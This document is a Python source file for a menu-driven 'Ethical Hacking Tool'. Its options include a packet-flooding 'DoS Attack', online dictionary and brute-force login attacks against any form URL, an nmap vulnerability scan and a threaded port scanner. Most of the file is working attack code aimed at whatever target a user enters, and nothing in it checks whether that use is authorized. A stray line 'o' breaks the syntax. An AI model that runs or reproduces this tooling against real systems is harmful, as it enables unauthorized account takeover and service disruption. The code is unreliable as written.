# Importing necessary modules
import os
import sys
import socket
import base64
import time
import random
import string
import requests
import concurrent.futures
from colorama import init, Fore, Style
from termcolor import colored
import itertools
import subprocess
import threading
from queue import Queue

init()

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def display_menu():
    clear_screen()
    asc = """
                                                       
                   ,--,                                
    ,---,.       ,--.'|  .--.--.      ,---,  ,----..   
  ,'  .'  \   ,--,  | : /  /    '. ,`--.' | /   /   \  
,---.' .' |,---.'|  : '|  :  /`. //    /  :|   :     : 
|   |  |: |;   : |  | ;;  |  |--`:    |.' '.   |  ;. / 
:   :  :  /|   | : _' ||  :  ;_  `----':  |.   ; /--`  
:   |    ; :   : |.'  | \  \    `.  '   ' ;;   | ;     
|   :     \|   ' '  ; :  `----.   \ |   | ||   : |     
|   |   . |\   \  .'. |  __ \  \  | '   : ;.   | '___  
'   :  '; | `---`:  | ' /  /`--'  / |   | ''   ; : .'| 
|   |  | ;       '  ; |'--'.     /  '   : |'   | '/  : 
|   :   /        |  : ;  `--'---'   ;   |.'|   :    /  
|   | ,'         '  ,/              '---'   \   \ .'   
`----'           '--'                        `---`     
                                                                                                                         
    """
    print(colored(asc, "yellow"))
    print("Choose an option:")
    print("1. Scan for Vulnerabilities")
    print("2. Generate Passwords")
    print("3. IP Lookup")
    print("4. Base64 Deobfuscator")
    print("5. DoS Attack")
    print("6. Dictionary Attack")
    print("7. Brute Force Attack")
    print("8. Port Scanner")
    print("9. Exit")

def scan_vulnerabilities():
    clear_screen()
    target = input("Enter the target IP address or hostname to scan: ")

    try:
        print(colored(f"Scanning {target} for vulnerabilities using nmap...", "cyan"))

        nmap_process = subprocess.Popen(['nmap', '-sV', '--script', 'vuln', target], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        nmap_output, nmap_error = nmap_process.communicate()

        if nmap_error:
            print(colored(f"Error running nmap: {nmap_error.decode('utf-8')}", "red"))
        else:
            # Print nmap output
            print(colored("Nmap scan results:", "green"))
            print(nmap_output.decode('utf-8'))

    except Exception as e:
        print(colored(f"An error occurred: {str(e)}", "red"))

    input("Press Enter to return to menu...")

def generate_passwords():
    clear_screen()
    print(Fore.YELLOW + Style.BRIGHT + "Generate Passwords" + Style.RESET_ALL)

    include_letters = input(Fore.CYAN + "Include letters? (y/n, default: y): " + Style.RESET_ALL).lower() != 'n'
    include_numbers = input(Fore.CYAN + "Include numbers? (y/n, default: y): " + Style.RESET_ALL).lower() != 'n'
    include_symbols = input(Fore.CYAN + "Include symbols? (y/n, default: y): " + Style.RESET_ALL).lower() != 'n'
    password_size = input(Fore.CYAN + f"Enter password size (default: 15): " + Style.RESET_ALL)
    if password_size.isdigit():
        password_size = int(password_size)
    else:
        password_size = 15 

    if include_letters and include_numbers and include_symbols and password_size == 15:
        print(Fore.YELLOW + "Default settings used (letters + numbers + symbols, size: 15)" + Style.RESET_ALL)

    characters = ""
    if include_letters:
        characters += string.ascii_letters
    if include_numbers:
        characters += string.digits
    if include_symbols:
        characters += string.punctuation


    passwords = []
    for _ in range(3):  
        generated_password = ''.join(random.choice(characters) for _ in range(password_size))
        passwords.append(generated_password)
        print(Fore.GREEN + f"Generated: {generated_password}" + Style.RESET_ALL)

    input(Fore.YELLOW + "Press Enter to return to menu..." + Style.RESET_ALL)

o
def fetch_ip_details(ip_address):
    try:
        response = requests.get(f"http://ipinfo.io/{ip_address}/json")
        if response.status_code == 200:
            return response.json()
        else:
            return None
    except requests.exceptions.RequestException as e:
        print(Fore.RED + f"Error fetching IP details: {str(e)}" + Style.RESET_ALL)
        return None
    except Exception as e:
        print(Fore.RED + f"An unexpected error occurred: {str(e)}" + Style.RESET_ALL)
        return None


def ip_lookup():
    clear_screen()
    print(Fore.YELLOW + Style.BRIGHT + "IP Lookup" + Style.RESET_ALL)
    print()

    while True:
        hostname = input(Fore.CYAN + "Enter hostname or IP address to lookup (or 'exit' to return to menu): " + Style.RESET_ALL)

        if hostname.lower() == 'exit':
            return

        try:
            ip_address = socket.gethostbyname(hostname)
            print(Fore.GREEN + f"The IP address of {hostname} is: {ip_address}" + Style.RESET_ALL)

            ip_details = fetch_ip_details(ip_address)
            if ip_details:
                print(Fore.YELLOW + "Additional details:" + Style.RESET_ALL)
                print(f"  - City: {ip_details.get('city', 'N/A')}")
                print(f"  - Region: {ip_details.get('region', 'N/A')}")
                print(f"  - Country: {ip_details.get('country', 'N/A')}")
                print(f"  - Location: {ip_details.get('loc', 'N/A')}")
                print(f"  - ISP: {ip_details.get('org', 'N/A')}")
                print(f"  - AS: {ip_details.get('asn', 'N/A')}")
            else:
                print(Fore.RED + "Failed to fetch additional details." + Style.RESET_ALL)
        except socket.gaierror:
            print(Fore.RED + "Hostname could not be resolved. Please check the input." + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + f"An error occurred: {str(e)}" + Style.RESET_ALL)

        input(Fore.YELLOW + "Press Enter to continue..." + Style.RESET_ALL)
        clear_screen()  


def base64_deobfuscator():
    clear_screen()
    print(Fore.YELLOW + Style.BRIGHT + "Base64 Deobfuscator" + Style.RESET_ALL)
    print()

    while True:
        encoded_data = input(Fore.CYAN + "Enter the Base64 encoded string (or 'exit' to return to menu): " + Style.RESET_ALL)

        if encoded_data.lower() == 'exit':
            return

        try:
            decoded_data = base64.b64decode(encoded_data).decode('utf-8')
            print(Fore.GREEN + f"The decoded data is: {decoded_data}" + Style.RESET_ALL)
        except base64.binascii.Error:
            print(Fore.RED + "Error decoding Base64 string: Invalid input. Please check the input." + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + f"An error occurred: {str(e)}" + Style.RESET_ALL)

        input(Fore.YELLOW + "Press Enter to continue..." + Style.RESET_ALL)
        clear_screen()


def simple_dos_attack():
    clear_screen()
    target = input(Fore.YELLOW + "Enter the target IP address or hostname: " + Style.RESET_ALL)
    print()

    try:
        target_ip = socket.gethostbyname(target)
        print(Fore.CYAN + f"Attacking {target_ip} with a simple DoS attack..." + Style.RESET_ALL)
        print()

        packet_type = input(Fore.YELLOW + "Choose packet type (UDP or TCP, default: TCP): " + Style.RESET_ALL).upper() or 'TCP'
        packet_size = int(input(Fore.YELLOW + "Enter packet size (bytes, default: 1024): " + Style.RESET_ALL) or 1024)
        num_packets = int(input(Fore.YELLOW + "Enter number of packets (default: 10): " + Style.RESET_ALL) or 10)
        delay = float(input(Fore.YELLOW + "Enter delay between packets (seconds, default: 0.1): " + Style.RESET_ALL) or 0.1)

        for i in range(num_packets):
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM if packet_type == 'UDP' else socket.SOCK_STREAM) as s:
                if packet_type == 'UDP':
                    s.sendto(b'A' * packet_size, (target_ip, 80))  
                else:
                    s.connect((target_ip, 80)) 
                    s.sendall(b'A' * packet_size) 

                print(Fore.YELLOW + f"Sent {packet_type} packet {i+1}/{num_packets}, size: {packet_size} bytes" + Style.RESET_ALL)

                time.sleep(delay) 

        print()
        print(Fore.GREEN + f"DoS attack on {target_ip} completed." + Style.RESET_ALL)
    except socket.gaierror:
        print(Fore.RED + "Error: Hostname could not be resolved. Please check the input." + Style.RESET_ALL)
    except socket.error as e:
        print(Fore.RED + f"Socket error: {str(e)}. Please check the input or network connection." + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"An unexpected error occurred: {str(e)}" + Style.RESET_ALL)

    input(Fore.YELLOW + "\nPress Enter to return to menu..." + Style.RESET_ALL)


def dictionary_attack():
    clear_screen()
    print(Fore.YELLOW + Style.BRIGHT + "Dictionary Attack" + Style.RESET_ALL)
    print()

    print(Fore.CYAN + "Explanation of Field Names:" + Style.RESET_ALL)
    print(Fore.GREEN + "Field names are the 'name' attributes of the input fields in the HTML form.\n"
                       "To find these names, follow these steps:" + Style.RESET_ALL)
    print("1. Open the target login page in your web browser.")
    print("2. Right-click on the username input field and select 'Inspect' or 'Inspect Element'.")
    print("3. Look for the 'name' attribute of the input element. It will look something like <input name='username'>.")
    print("4. Repeat the process for the password input field.")
    print()


    url = input(Fore.CYAN + "Enter the URL of the login form: " + Style.RESET_ALL)
    request_method = input(Fore.CYAN + "Enter the request method (GET or POST, default: POST): " + Style.RESET_ALL).upper() or 'POST'
    username_field = input(Fore.CYAN + "Enter the form field name for the username: " + Style.RESET_ALL)
    password_field = input(Fore.CYAN + "Enter the form field name for the password: " + Style.RESET_ALL)
    username = input(Fore.CYAN + "Enter the username or target account: " + Style.RESET_ALL)
    password_file = input(Fore.CYAN + "Enter the path to the password dictionary file: " + Style.RESET_ALL)
    success_status_code = int(input(Fore.CYAN + "Enter the success status code (default: 200): " + Style.RESET_ALL) or 200)
    success_text = input(Fore.CYAN + "Enter text to look for in a successful response (leave blank if not applicable): " + Style.RESET_ALL)
    custom_headers = input(Fore.CYAN + "Enter any custom headers (key:value, comma-separated, leave blank if not applicable): " + Style.RESET_ALL)

    headers = {}
    if custom_headers:
        header_pairs = custom_headers.split(',')
        for pair in header_pairs:
            key, value = pair.split(':')
            headers[key.strip()] = value.strip()

    try:
        with open(password_file, 'r') as file:
            passwords = file.readlines()
            passwords = [password.strip() for password in passwords]

        print(Fore.YELLOW + f"Starting dictionary attack on {username} at {url}..." + Style.RESET_ALL)

        for password in passwords:
            payload = {username_field: username, password_field: password}
            if request_method == 'GET':
                response = requests.get(url, params=payload, headers=headers)
            else:
                response = requests.post(url, data=payload, headers=headers)

            if response.status_code == success_status_code and (not success_text or success_text in response.text):
                print(Fore.GREEN + f"Login successful! Password found: {password}" + Style.RESET_ALL)
                break
            else:
                print(Fore.RED + f"Failed with password: {password}" + Style.RESET_ALL)
                time.sleep(0.1) 

        else:
            print(Fore.RED + "Dictionary attack completed. Password not found." + Style.RESET_ALL)

    except FileNotFoundError:
        print(Fore.RED + "File not found. Please check the file path and try again." + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"An error occurred: {str(e)}" + Style.RESET_ALL)

    input(Fore.YELLOW + "Press Enter to return to menu..." + Style.RESET_ALL)


def brute_force_attack():
    clear_screen()
    print(Fore.YELLOW + Style.BRIGHT + "Brute Force Attack" + Style.RESET_ALL)
    print()

    print(Fore.CYAN + "Explanation of Field Names:" + Style.RESET_ALL)
    print(Fore.GREEN + "Field names are the 'name' attributes of the input fields in the HTML form.\n"
                       "To find these names, follow these steps:" + Style.RESET_ALL)
    print("1. Open the target login page in your web browser.")
    print("2. Right-click on the username input field and select 'Inspect' or 'Inspect Element'.")
    print("3. Look for the 'name' attribute of the input element. It will look something like <input name='username'>.")
    print("4. Repeat the process for the password input field.")
    print()

    url = input(Fore.CYAN + "Enter the URL of the login form: " + Style.RESET_ALL)
    request_method = input(Fore.CYAN + "Enter the request method (GET or POST, default: POST): " + Style.RESET_ALL).upper() or 'POST'
    username_field = input(Fore.CYAN + "Enter the form field name for the username: " + Style.RESET_ALL)
    password_field = input(Fore.CYAN + "Enter the form field name for the password: " + Style.RESET_ALL)
    username = input(Fore.CYAN + "Enter the username or target account: " + Style.RESET_ALL)
    password_length = int(input(Fore.CYAN + "Enter the maximum length of passwords to brute force: " + Style.RESET_ALL))
    success_status_code = int(input(Fore.CYAN + "Enter the success status code (default: 200): " + Style.RESET_ALL) or 200)
    success_text = input(Fore.CYAN + "Enter text to look for in a successful response (leave blank if not applicable): " + Style.RESET_ALL)
    custom_headers = input(Fore.CYAN + "Enter any custom headers (key:value, comma-separated, leave blank if not applicable): " + Style.RESET_ALL)

    headers = {}
    if custom_headers:
        header_pairs = custom_headers.split(',')
        for pair in header_pairs:
            key, value = pair.split(':')
            headers[key.strip()] = value.strip()

    print(Fore.YELLOW + f"Starting brute force attack on {username} at {url}..." + Style.RESET_ALL)

    chars = string.ascii_letters + string.digits + string.punctuation
    found = False

    try:
        for length in range(1, password_length + 1):
            if found:
                break
            for password_tuple in itertools.product(chars, repeat=length):
                brute_password = ''.join(password_tuple)
                payload = {username_field: username, password_field: brute_password}
                
                if request_method == 'GET':
                    response = requests.get(url, params=payload, headers=headers)
                else:
                    response = requests.post(url, data=payload, headers=headers)

                if response.status_code == success_status_code and (not success_text or success_text in response.text):
                    print(Fore.GREEN + f"Login successful! Password found: {brute_password}" + Style.RESET_ALL)
                    found = True
                    break
                else:
                    print(Fore.RED + f"Failed with password: {brute_password}" + Style.RESET_ALL)
                    time.sleep(0.01) 

        if not found:
            print(Fore.RED + "Brute force attack completed. Password not found." + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"An error occurred: {str(e)}" + Style.RESET_ALL)

    input(Fore.YELLOW + "Press Enter to return to menu..." + Style.RESET_ALL)

def clear_screen():
    import os
    os.system('cls' if os.name == 'nt' else 'clear')


def scan_port(target, port, timeout):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            result = s.connect_ex((target, port))
            if result == 0:
                return port, True
            else:
                return port, False
    except Exception as e:
        return port, False

def worker(target, timeout, queue, results):
    while not queue.empty():
        port = queue.get()
        result = scan_port(target, port, timeout)
        results.append(result)
        queue.task_done()

def port_scanner():
    clear_screen()
    print(Fore.YELLOW + Style.BRIGHT + "Port Scanner" + Style.RESET_ALL)
    print()

    target = input(Fore.CYAN + "Enter the target IP address or hostname: " + Style.RESET_ALL)
    port_range = input(Fore.CYAN + "Enter port range (e.g., 1-1024): " + Style.RESET_ALL).split('-')
    port_range = range(int(port_range[0]), int(port_range[1]) + 1)
    timeout = float(input(Fore.CYAN + "Enter timeout for each port (seconds, default: 0.5): " + Style.RESET_ALL) or 0.5)
    num_threads = int(input(Fore.CYAN + "Enter number of threads for concurrent scanning (default: 100): " + Style.RESET_ALL) or 100)

    try:
        target_ip = socket.gethostbyname(target)
        print(Fore.YELLOW + f"Scanning {target_ip} for open ports..." + Style.RESET_ALL)
    except socket.gaierror:
        print(Fore.RED + "Error: Hostname could not be resolved. Please check the input." + Style.RESET_ALL)
        return
    except Exception as e:
        print(Fore.RED + f"An error occurred: {str(e)}" + Style.RESET_ALL)
        return

    port_queue = Queue()
    for port in port_range:
        port_queue.put(port)

    scan_results = []

    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=worker, args=(target_ip, timeout, port_queue, scan_results))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    open_ports = [port for port, status in scan_results if status]
    if open_ports:
        print(Fore.GREEN + f"Open ports on {target_ip}:" + Style.RESET_ALL)
        for port in open_ports:
            print(Fore.GREEN + f"Port {port} is open" + Style.RESET_ALL)
    else:
        print(Fore.RED + f"No open ports found on {target_ip} in the specified range." + Style.RESET_ALL)

    input(Fore.YELLOW + "Press Enter to return to menu..." + Style.RESET_ALL)


def main():
    while True:
        display_menu()
        choice = input("Enter your choice: ")

        if choice == '1':
            scan_vulnerabilities()
        elif choice == '2':
            generate_passwords()
        elif choice == '3':
            ip_lookup()
        elif choice == '4':
            base64_deobfuscator()
        elif choice == '5':
            simple_dos_attack()
        elif choice == '6':
            dictionary_attack()
        elif choice == '7':
            brute_force_attack()
        elif choice == '8':
            port_scanner()
        elif choice == '9':
            clear_screen()
            print(colored("Exiting Ethical Hacking Tool...", "yellow"))
            sys.exit()
        else:
            print(colored("Invalid choice. Please enter a valid option.", "red"))
            input("Press Enter to continue...")

if __name__ == "__main__":
    main()
